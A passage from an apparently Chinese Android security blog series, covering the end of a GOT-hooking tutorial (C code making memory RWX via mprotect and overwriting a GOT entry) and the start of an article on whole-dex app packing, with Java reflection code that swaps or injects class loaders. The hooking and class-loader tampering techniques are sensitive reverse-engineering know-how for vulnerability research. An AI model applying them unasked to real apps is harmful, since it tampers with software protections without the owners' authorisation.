class=\"number\">1</span>));</span><br><span class=\"line\">                    <span class=\"comment\">// 修改内存属性为可读可写可执行</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span>(mprotect((<span class=\"type\">uint64_t</span>*)entry_page_start, page_size, PROT_READ | PROT_WRITE | PROT_EXEC) == <span class=\"number\">-1</span>)&#123;</span><br><span class=\"line\">                        __android_log_print(<span class=\"number\">6</span>,<span class=\"string\">&quot;windaa&quot;</span>,<span class=\"string\">&quot;%s&quot;</span>,<span class=\"string\">&quot;mprotect failed&quot;</span>);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    value = (<span class=\"type\">uint64_t</span>)mywin1;</span><br><span class=\"line\">                    <span class=\"comment\">//将mywind0函数的地址换成mywind1函数的地址</span></span><br><span class=\"line\">                    <span class=\"built_in\">memcpy</span>((saddr+j/<span class=\"number\">4</span>),&amp;value,<span class=\"number\">16</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/56.png\" alt=\"image-20220517193556517\"></p>\n<p>这里我们就可以发现成功的hook</p>\n<p>got hook使用姿势：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）使用/proc/self/maps去获得so模块的加载地址</span><br><span class=\"line\">（2）使用ElfHeader找到Section的首地址，并计算offset和size来获取StringTable</span><br><span class=\"line\">（3）找到got表位置，计算其内存位置，并指针指向got表首地址</span><br><span class=\"line\">（4）遍历got表中的函数，找到要hook的函数，使用mprotect进行hook</span><br><span class=\"line\">（5）将hook的函数地址替换为我们定义的函数地址</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-Unicorn-hook使用\"><a href=\"#5-Unicorn-hook使用\" class=\"headerlink\" title=\"5.Unicorn hook使用\"></a>5.Unicorn hook使用</h3><p>这里我们简单了解一下基于unicorn的框架Unidbg的hook使用</p>\n<p>开源地址：<a href=\"https://github.com/zhkl0228/unidbg\">https://github.com/zhkl0228/unidbg</a></p>\n<p>这里我们直接idea将项目拉取下来，然后等下项目环境配置完成</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/57.png\" alt=\"image-20220517214320334\"></p>\n<p>配置完成后，我们直接启动里面的示例代码查看hook效果</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/58.png\" alt=\"image-20220517214506632\"></p>\n<p>这里unidbg使用了xHook，xHook是一种PLT hook的方式，当然这只是unidbg强大功能其中的一种，也是hook技术中一种，这里就简单介绍到这，后续再详细讲如何使用</p>\n<p>unidbg使用参考博客：<a href=\"https://www.qinless.com/670\">https://www.qinless.com/670</a></p>\n<h2 id=\"六、实验总结\"><a href=\"#六、实验总结\" class=\"headerlink\" title=\"六、实验总结\"></a>六、实验总结</h2><p>本文从程序加载的原理出发，讲解了当下常用的一些基本的hook方式和手段，后续对其中一些hook方式再次深入讲解，实验的一些样本和代码会上传到知识星球和github，文章参考学了了很多大佬的文章和大佬星球的内容，参考文献放在末尾，有什么问题，就请各位大佬一一指出了。</p>\n<p>github的地址：<a href=\"https://github.com/WindXaa\">github</a></p>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><p>参考书籍：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">参考书目：《程序员的自我修养——链接、装载与库》</span><br></pre></td></tr></table></figure>\n\n<p>GOT和PLT:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://www.geek-share.com/detail/2774116640.html</span><br><span class=\"line\">https://www.jianshu.com/p/0ac63c3744dd</span><br><span class=\"line\">https://www.zhihu.com/question/21249496</span><br><span class=\"line\">https://www.codeleading.com/article/37234101170/</span><br></pre></td></tr></table></figure>\n\n<p>hook技术</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://zhuanlan.zhihu.com/p/389889716</span><br><span class=\"line\">https://mabin004.github.io/2018/07/31/Mac%E4%B8%8A%E7%BC%96%E8%AF%91Frida/</span><br><span class=\"line\">https://zhuanlan.zhihu.com/p/269441842</span><br><span class=\"line\">https://blog.csdn.net/sdoyuxuan/article/details/78481239</span><br><span class=\"line\">https://www.cnblogs.com/codingmengmeng/p/6046481.html</span><br><span class=\"line\">https://blog.csdn.net/sssssuuuuu666/article/details/78788369</span><br><span class=\"line\">https://www.malwaretech.com/2015/01/inline-hooking-for-programmers-part-1.html</span><br><span class=\"line\">https://juejin.cn/post/6844903993668272141</span><br></pre></td></tr></table></figure>\n\n<p>got&#x2F;plt hook:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://www.likecs.com/show-203321775.html</span><br><span class=\"line\">https://www.lmlphp.com/user/65342/article/item/709806/</span><br></pre></td></tr></table></figure>\n\n","categories":["Android APP漏洞之战"],"tags":["漏洞挖掘","工具"]},{"title":"Android App漏洞之战（7）——（脱壳篇）整体壳脱壳技巧详解","url":"/2023/02/09/bug0007/","content":"<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>为了帮助更加方便的进行漏洞挖掘工作，前面我们通过了几篇文章详解的给大家介绍了动态调试技术、过反调试技术、Hook技术、过反Hook技术、抓包技术等，掌握了这些可以很方便的开展App漏洞挖掘工作，而最后我们还需要掌握一定的脱壳技巧，进行进一步助力我们漏洞挖掘的效率，本文主要介绍Android App加壳中的整体dex加壳，帮助大家掌握加壳的原理和脱壳的各种技能。</p>\n<span id=\"more\"></span>\n<p>本文第二节主要讲述Android启动流程和加壳原理</p>\n<p>本文第三节主要介绍整体加壳的实现</p>\n<p>本文第四节主要讲当下脱壳点的概念</p>\n<p>本文第五节讲述现有的脱壳技巧</p>\n<h2 id=\"二、相关介绍\"><a href=\"#二、相关介绍\" class=\"headerlink\" title=\"二、相关介绍\"></a>二、相关介绍</h2><h3 id=\"1-Android-App启动流程\"><a href=\"#1-Android-App启动流程\" class=\"headerlink\" title=\"1.Android App启动流程\"></a>1.Android App启动流程</h3><h4 id=\"（1）Android系统启动流程\"><a href=\"#（1）Android系统启动流程\" class=\"headerlink\" title=\"（1）Android系统启动流程\"></a>（1）Android系统启动流程</h4><p>我们要彻底的了解App加壳原理，首先我们从了解App的启动流程出发，先于App启动之前，Android系统是启动最早，下面我们来详细查看一下Android系统的启动过程：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/1.png\"></p>\n<p>我在<a href=\"https://blog.csdn.net/hzwailll/article/details/85339714\">Xposed源码定制</a>一文中详细的讲解了Android的启动流程，简单来说就是：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/2.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">加载BootLoader --&gt; 初始化内核 --&gt; 启动init进程 --&gt; init进程fork出Zygote进程 --&gt; Zygote进程fork出SystemServer进程</span><br></pre></td></tr></table></figure>\n\n<p>我们就了解了最后Zygote进程fork出第一个进程：<code>SystemServer</code>进程，SystemServer主要完成了以下工作：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/3.png\" alt=\"image-20220612154820955\"></p>\n<p><strong>android app安装</strong></p>\n<p>首先这里我们先介绍一下<code>PackageManagerService</code>，其主要是完成Android中应用程序安装的服务，我们了解的Android应用程序安装的方式：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">· 系统启动时安装，没有安装界面</span><br><span class=\"line\">· 第三方应用安装，有安装界面，也是我们最熟悉的方式</span><br><span class=\"line\">· ADB命令安装，没有安装界面</span><br><span class=\"line\">· 通过各类应用市场安装，没有安装界面</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/4.png\" alt=\"image-20220612154820955\"></p>\n<p>虽然安装方式不同，但是最后四种方式都是通过PackageManagerService服务来完成应用程序的安装。而PackageManagerService服务则通过与Installd服务通信，发送具体的指令来执行应用程序的安装、卸载等工作</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> IPackageManager <span class=\"title function_\">main</span><span class=\"params\">(Context context, Installer installer,</span></span><br><span class=\"line\"><span class=\"params\">    <span class=\"type\">boolean</span> factoryTest, <span class=\"type\">boolean</span> onlyCore)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">PackageManagerService</span> <span class=\"variable\">m</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">PackageManagerService</span>(context, installer, factoryTest, onlyCore);</span><br><span class=\"line\">        ServiceManager.addService(<span class=\"string\">&quot;package&quot;</span>, m);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> m;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>应用程序在安装时涉及到如下几个重要目录：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/5.png\" alt=\"image-20220612154820955\"></p>\n<p>我们了解完App的安装流程是由<code>PackageManagerService</code>，同理SystemServer启动了一个更加重要的服务<code>ActivityManagerService</code>, 而AMS其中很重要的一个作用就是启动<code>Launcher</code>进程，具体是怎么启动的，大家可以参考文章:<a href=\"https://blog.csdn.net/itachi85/article/details/56669808\">Android系统启动流程（四）Launcher启动过程与系统启动流程</a>，这里就不再详细讲解，而进入<code>Launcher</code>进程，我们就进入了App启动的流程。</p>\n<h4 id=\"（2）App启动流程\"><a href=\"#（2）App启动流程\" class=\"headerlink\" title=\"（2）App启动流程\"></a>（2）App启动流程</h4><p>Android系统启动的最后一步是启动一个Home应用程序，这个应用程序用来显示系统中已经安装的应用程序，这个Home应用程序就叫做Launcher。应用程序Launcher在启动过程中会请求PackageManagerService返回系统中已经安装的应用程序的信息，并将这些信息封装成一个快捷图标列表显示在系统屏幕上，这样用户可以通过点击这些快捷图标来启动相应的应用程序</p>\n<p>前面我们描述了AMS将Launcher启动，然后进入App启动流程，这里参考文章：<a href=\"https://blog.csdn.net/hzwailll/article/details/85339714\">ActivityThread的理解和APP的启动过程</a></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/6.png\" alt=\"image-20220612154820955\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">(1)点击桌面APP图标时，Launcher的startActivity()方法，通过Binder通信，调用system_server进程中AMS服务的startActivity方法，发起启动请求</span><br><span class=\"line\">(2)system_server进程接收到请求后，向Zygote进程发送创建进程的请求</span><br><span class=\"line\">(3)Zygote进程fork出App进程，并执行ActivityThread的main方法，创建ActivityThread线程，初始化MainLooper，主线程Handler，同时初始化ApplicationThread用于和AMS通信交互</span><br><span class=\"line\">(4)App进程，通过Binder向sytem_server进程发起attachApplication请求，这里实际上就是APP进程通过Binder调用sytem_server进程中AMS的attachApplication方法,AMS的attachApplication方法的作用是将ApplicationThread对象与AMS绑定</span><br><span class=\"line\">(5)system_server进程在收到attachApplication的请求，进行一些准备工作后，再通过binder IPC向App进程发送handleBindApplication请求（初始化Application并调用onCreate方法）和scheduleLaunchActivity请求（创建启动Activity）</span><br><span class=\"line\">(6)App进程的binder线程（ApplicationThread）在收到请求后，通过handler向主线程发送BIND_APPLICATION和LAUNCH_ACTIVITY消息，这里注意的是AMS和主线程并不直接通信，而是AMS和主线程的内部类ApplicationThread通过Binder通信，ApplicationThread再和主线程通过Handler消息交互。</span><br><span class=\"line\">(7)主线程在收到Message后，创建Application并调用onCreate方法，再通过反射机制创建目标Activity，并回调Activity.onCreate()等方法</span><br><span class=\"line\">(8)到此，App便正式启动，开始进入Activity生命周期，执行完onCreate/onStart/onResume方法，UI渲染后显示APP主界面</span><br></pre></td></tr></table></figure>\n\n<p>到这里，我们的大致弄清了APP的启动流程，而这里我们就进入了加壳中十分重要的地方<code>ActivityTread</code></p>\n<h4 id=\"（3）ActivityThread启动流程\"><a href=\"#（3）ActivityThread启动流程\" class=\"headerlink\" title=\"（3）ActivityThread启动流程\"></a>（3）ActivityThread启动流程</h4><p>寒冰大佬在<a href=\"https://bbs.pediy.com/thread-252630.htm\">FART：ART环境下基于主动调用的自动化脱壳方案 </a>一文中讲述了ActivityThread.main()是进入App世界的大门，并由此展开了对加壳原理的讲述</p>\n<p>同理接下来，我们开始进行源码分析，了解ActivityThread的具体操作：</p>\n<p><code>xref/frameworks/base/core/java/android/app/ActivityThread.java</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/8.png\" alt=\"image-20220612164337749\"></p>\n<p>根据寒冰大佬描述，在ActivityThread完成实例化操作，调用thread.attach(false)完成一系列初始化准备工作，最后主线程进入消息循环，等待接收来自系统的消息。当收到系统发送来的bindapplication的进程间调用时，调用函数<code>handlebindapplication</code>来处理该请求</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">handleMessage</span><span class=\"params\">(Message msg)</span> &#123;</span><br><span class=\"line\">****</span><br><span class=\"line\">    <span class=\"keyword\">case</span> BIND_APPLICATION:</span><br><span class=\"line\">        Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, <span class=\"string\">&quot;bindApplication&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">AppBindData</span> <span class=\"variable\">data</span> <span class=\"operator\">=</span> (AppBindData)msg.obj;</span><br><span class=\"line\">        handleBindApplication(data);</span><br><span class=\"line\">        Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">****</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在处理消息过程，很很明显进入了<code>handlebindapplication</code>函数</p>\n<p>这里我再用寒冰大佬文章的内容：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/9.png\" alt=\"image-20220612164337749\"></p>\n<p>我们定位第四步，Application进行实例化，然后进入<code>makeApplication</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/11.png\" alt=\"image-20220612165753498\"></p>\n<p>然后我们进入<code>newApplication</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/12.png\" alt=\"image-20220612170020202\"></p>\n<p>这里我们可以看见完成了两件事：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）完成了Application的实例化</span><br><span class=\"line\">（2）并调用Application.attach()函数</span><br></pre></td></tr></table></figure>\n\n<p>然后我们继续进入<code>Application.attach()</code>函数</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/13.png\" alt=\"image-20220612170305879\"></p>\n<p>这里我们就进一步调用了<code>attachBaseContext()</code>方法</p>\n<p>最后回到<code>handlebindapplication</code>中执行第6步，进入callApplicationOnCreate()函数</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/14.png\" alt=\"image-20220612170604374\"></p>\n<p>就执行了<code>Application.onCreate()方法</code></p>\n<p>总结：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">从上可知, App的运行流程是</span><br><span class=\"line\">\t初始化————&gt;Application的构造函数————&gt;Application.attachBaseContext()————&gt;Application.onCreate()函数</span><br><span class=\"line\">最后才会进入MainActivity中的attachBaseContext函数、onCreate函数</span><br><span class=\"line\">所以加壳厂商要在程序正式执行前，也就是上面的流程中进行动态加载和类加载器的修正，这样才能对加密的dex进行释放，而一般的1厂商往往选择在Application中的attachBaseContext或onCreate函数进行</span><br></pre></td></tr></table></figure>\n\n<p>这里我附上网上一个大佬的详细执行流程图：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/7.png\" alt=\"image-20220612170604374\"></p>\n<h3 id=\"2-整体加壳原理详解\"><a href=\"#2-整体加壳原理详解\" class=\"headerlink\" title=\"2.整体加壳原理详解\"></a>2.整体加壳原理详解</h3><h4 id=\"（1）整体加壳原理\"><a href=\"#（1）整体加壳原理\" class=\"headerlink\" title=\"（1）整体加壳原理\"></a>（1）整体加壳原理</h4><p>Dex整体加壳可以理解为在加密的源Apk程序外面有套上了一层外壳，简单过程为：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/15.png\" alt=\"image-20220424141415510\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/16.png\" alt=\"image-20220424141415510\"></p>\n<p>如何对App进行加一层外壳呢，这里就需要应用动态加载的原理，关于动态加载和类加载器，我在上篇文章中有详细讲解：<a href=\"https://bbs.pediy.com/thread-271538.htm\">Android加壳脱壳学习（1）——动态加载和类加载机制详解</a></p>\n<p>这里我们可以用一个案例来进一步讲述，我们打开一个整体加壳的样本</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/17.png\" alt=\"image-20220612172943793\"></p>\n<p>我们很明显看见，除了一个代理类Application，其他相关的代码信息都无法发现</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/18.png\" alt=\"image-20220612173124912\"></p>\n<p>在代理类中反射调用了一些方法，很显然我们解析出的结果都无法查找，很明显就说明在Application.attchBaseContext()和Application.onCreate()中必须要完成对源加密的dex的动态加载和解密</p>\n<p>结合上面的描述，App加载应用解析时就是这个流程：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）BootClassLoader加载系统核心库</span><br><span class=\"line\">（2）PathClassLoader加载APP自身dex</span><br><span class=\"line\">（3）进入APP自身组件，解析AndroidManifest.xml，然后查找Application代理</span><br><span class=\"line\">（4）调用声明Application的attachBaseContext()对源程序进行动态加载或解密</span><br><span class=\"line\">（5）调用声明Application的onCreate()对源程序进行动态加载或解密</span><br><span class=\"line\">（6）进入MainActivity中的attachBaseContext()，然后进入onCreate()函数，执行源程序代码</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）类加载器的修正\"><a href=\"#（2）类加载器的修正\" class=\"headerlink\" title=\"（2）类加载器的修正\"></a>（2）类加载器的修正</h4><p>上面我们已经很清晰的了解了壳加载的流程，我们很明显的意识到一个问题，我们从头到尾都是用<code>PathClassLoader</code>来加载dex，而上篇文章我在讲类加载器的过程中说过</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/19.png\" alt=\"image-20220612185103615\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Android中的ClassLoader类型分为系统ClassLoader和自定义ClassLoader。其中系统ClassLoader包括<span class=\"number\">3</span>种是BootClassLoader、DexClassLoader、PathClassLoader</span><br><span class=\"line\">(<span class=\"number\">1</span>)BootClassLoader:Android平台上所有Android系统启动时会使用BootClassLoader来预加载常用的类</span><br><span class=\"line\">(<span class=\"number\">2</span>)BaseDexClassLoader:实际应用层类文件的加载，而真正的加载委托给pathList来完成</span><br><span class=\"line\">(<span class=\"number\">3</span>)DexClassLoader:可以加载dex文件以及包含dex的压缩文件(apk,dex,jar,zip),可以安装一个未安装的apk文件，一般为自定义类加载器</span><br><span class=\"line\">(<span class=\"number\">4</span>)PathClassLoader:可以加载系统类和应用程序的类，通常用来加载已安装的apk的dex文件</span><br><span class=\"line\"> </span><br><span class=\"line\">补充：</span><br><span class=\"line\">Android 提供的原生加载器叫做基础类加载器，包括：BootClassLoader，PathClassLoader，DexClassLoader，InMemoryDexClassLoader（Android <span class=\"number\">8.0</span> 引入），DelegateLastClassLoader（Android <span class=\"number\">8.1</span> 引入）</span><br></pre></td></tr></table></figure>\n\n<p>我们要想动态加载dex文件必须使用自定义的<code>DexClassLoader</code>，那我们直接使用<code>DexClassLoader</code>进行加载就可以么，很显然不行，还是会报异常</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">DexClassLoader加载的类是没有组件生命周期的，即DexClassLoader即使通过对APK的动态加载完成了对组件类的加载，当系统启动该组件时，依然会出现加载类失败的异常</span><br></pre></td></tr></table></figure>\n\n<p>所以我们要想使用DexClassLoader进行动态加载dex，我们需要进行类加载器的修正</p>\n<p>当前实现类加载器的修正，主要有两种方案：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）替换系统组件类加载器为我们的DexClassLoader，同时设置DexClassLoader的parent为系统组件加载器</span><br><span class=\"line\">（2）打破原有的双亲委派关系，在系统组件类加载器PathClassLoader和BootClassLoader的中间插入我们自己的DexClassLoader</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"lt-1-gt-类加载器替换\"><a href=\"#lt-1-gt-类加载器替换\" class=\"headerlink\" title=\"&lt;1&gt;类加载器替换\"></a>&lt;1&gt;类加载器替换</h5><p>怎么去替换系统的类加载器了，这就和我们上面分析的ActivityThread中<code>LoadedApk</code>有关了，<code>LoadedApk</code>主要负责加载一个Apk程序，我们进一步分析源码</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/20.png\" alt=\"image-20220612190524422\"></p>\n<p>很明显，我们可以想到我们通过反射获取mclassLoader，然后使用我们的DexClassLoader进行替换，不就可以成功的让DexClassLoader拥有生命周期了么</p>\n<p>源码实现：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">总结：</span><br><span class=\"line\">\t（<span class=\"number\">1</span>）获取ActivityThread实例</span><br><span class=\"line\">\t（<span class=\"number\">2</span>）通过反射获取类加载器</span><br><span class=\"line\">\t（<span class=\"number\">3</span>）获取LoadedApk</span><br><span class=\"line\">\t（<span class=\"number\">4</span>）获取mClassLoader系统类加载器</span><br><span class=\"line\">\t（<span class=\"number\">5</span>）替换自定义类加载器为系统类加载器</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">replaceClassLoader</span><span class=\"params\">(Context context,ClassLoader dexClassLoader)</span>&#123;</span><br><span class=\"line\">       <span class=\"type\">ClassLoader</span> <span class=\"variable\">pathClassLoader</span> <span class=\"operator\">=</span> MainActivity.class.getClassLoader();</span><br><span class=\"line\">       <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">           <span class=\"comment\">//1.获取ActivityThread实例</span></span><br><span class=\"line\">           <span class=\"type\">Class</span> <span class=\"variable\">ActivityThread</span> <span class=\"operator\">=</span> pathClassLoader.loadClass(<span class=\"string\">&quot;android.app.ActivityThread&quot;</span>);</span><br><span class=\"line\">           <span class=\"type\">Method</span> <span class=\"variable\">currentActivityThread</span> <span class=\"operator\">=</span> ActivityThread.getDeclaredMethod(<span class=\"string\">&quot;currentActivityThread&quot;</span>);</span><br><span class=\"line\">           <span class=\"type\">Object</span> <span class=\"variable\">activityThreadObj</span> <span class=\"operator\">=</span> currentActivityThread.invoke(<span class=\"literal\">null</span>);</span><br><span class=\"line\">           <span class=\"comment\">//2.通过反射获得类加载器</span></span><br><span class=\"line\">           <span class=\"comment\">//final ArrayMap&lt;String, WeakReference&lt;LoadedApk&gt;&gt; mPackages = new ArrayMap&lt;&gt;();</span></span><br><span class=\"line\">           <span class=\"type\">Field</span> <span class=\"variable\">mPackagesField</span> <span class=\"operator\">=</span> ActivityThread.getDeclaredField(<span class=\"string\">&quot;mPackages&quot;</span>);</span><br><span class=\"line\">           mPackagesField.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">           <span class=\"comment\">//3.拿到LoadedApk</span></span><br><span class=\"line\">           <span class=\"type\">ArrayMap</span> <span class=\"variable\">mPackagesObj</span> <span class=\"operator\">=</span> (ArrayMap) mPackagesField.get(activityThreadObj);</span><br><span class=\"line\">           <span class=\"type\">String</span> <span class=\"variable\">packagename</span> <span class=\"operator\">=</span> context.getPackageName();</span><br><span class=\"line\">           <span class=\"type\">WeakReference</span> <span class=\"variable\">wr</span> <span class=\"operator\">=</span> (WeakReference) mPackagesObj.get(packagename);</span><br><span class=\"line\">           <span class=\"type\">Object</span> <span class=\"variable\">LoadApkObj</span> <span class=\"operator\">=</span> wr.get();</span><br><span class=\"line\">           <span class=\"comment\">//4.拿到mclassLoader</span></span><br><span class=\"line\">           <span class=\"type\">Class</span> <span class=\"variable\">LoadedApkClass</span> <span class=\"operator\">=</span> pathClassLoader.loadClass(<span class=\"string\">&quot;android.app.LoadedApk&quot;</span>);</span><br><span class=\"line\">           <span class=\"type\">Field</span> <span class=\"variable\">mClassLoaderField</span> <span class=\"operator\">=</span> LoadedApkClass.getDeclaredField(<span class=\"string\">&quot;mClassLoader&quot;</span>);</span><br><span class=\"line\">           mClassLoaderField.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">           <span class=\"type\">Object</span> <span class=\"variable\">mClassLoader</span> <span class=\"operator\">=</span>mClassLoaderField.get(LoadApkObj);</span><br><span class=\"line\">           Log.e(<span class=\"string\">&quot;mClassLoader&quot;</span>,mClassLoader.toString());</span><br><span class=\"line\">           <span class=\"comment\">//5.将系统组件ClassLoader给替换</span></span><br><span class=\"line\">           mClassLoaderField.set(LoadApkObj,dexClassLoader);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       <span class=\"keyword\">catch</span> (ClassNotFoundException e) &#123;</span><br><span class=\"line\">           e.printStackTrace();</span><br><span class=\"line\">       &#125; <span class=\"keyword\">catch</span> (NoSuchMethodException e) &#123;</span><br><span class=\"line\">           e.printStackTrace();</span><br><span class=\"line\">       &#125; <span class=\"keyword\">catch</span> (IllegalAccessException e) &#123;</span><br><span class=\"line\">           e.printStackTrace();</span><br><span class=\"line\">       &#125; <span class=\"keyword\">catch</span> (InvocationTargetException e) &#123;</span><br><span class=\"line\">           e.printStackTrace();</span><br><span class=\"line\">       &#125; <span class=\"keyword\">catch</span> (NoSuchFieldException e) &#123;</span><br><span class=\"line\">           e.printStackTrace();</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"lt-2-gt-类加载器插入\"><a href=\"#lt-2-gt-类加载器插入\" class=\"headerlink\" title=\"&lt;2&gt;类加载器插入\"></a>&lt;2&gt;类加载器插入</h5><p>还有一种方案，动态加载中我们讲述了类加载器的双亲委派机制，就是说我们的类加载器刚拿到类，并不会直接进行加载，而是先判断自己是否加载，如果没有加载则给自己的父类，父类再给父类，所以我们让DexClassLoader成为PathClassLoader的父类，这样就可以解决DexClassLoader生命周期的问题</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">总结：</span><br><span class=\"line\">\t（<span class=\"number\">1</span>）将DexClassloader父节点设置为BootClassLoader</span><br><span class=\"line\">\t（<span class=\"number\">2</span>）将PathClassLoader父节点设置为DexClassloader</span><br></pre></td></tr></table></figure>\n\n<p>代码实现：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">replaceClassLoader</span><span class=\"params\">(Context context, ClassLoader dexClassLoader)</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//将pathClassLoader父节点设置为DexClassLoader</span></span><br><span class=\"line\">        <span class=\"type\">ClassLoader</span> <span class=\"variable\">pathClassLoaderobj</span> <span class=\"operator\">=</span> context.getClassLoader();</span><br><span class=\"line\">        Class&lt;ClassLoader&gt; ClassLoaderClass = ClassLoader.class;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"type\">Field</span> <span class=\"variable\">parent</span> <span class=\"operator\">=</span> ClassLoaderClass.getDeclaredField(<span class=\"string\">&quot;parent&quot;</span>);</span><br><span class=\"line\">            parent.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">            parent.set(pathClassLoaderobj,dexClassLoader);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (NoSuchFieldException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IllegalAccessException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>完成壳加载器的修正后，我们就可以正常的加载dex了</p>\n<h2 id=\"三、整体加壳案例实现\"><a href=\"#三、整体加壳案例实现\" class=\"headerlink\" title=\"三、整体加壳案例实现\"></a>三、整体加壳案例实现</h2><p>前面我们详细讲述了App运行机制和整体加壳的实现机制，下面我们就按照前面的讲述，来实现一个简单的整体加壳案例</p>\n<p>实验准备：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">源程序</span><br><span class=\"line\">加壳程序</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"1-编写源程序\"><a href=\"#1-编写源程序\" class=\"headerlink\" 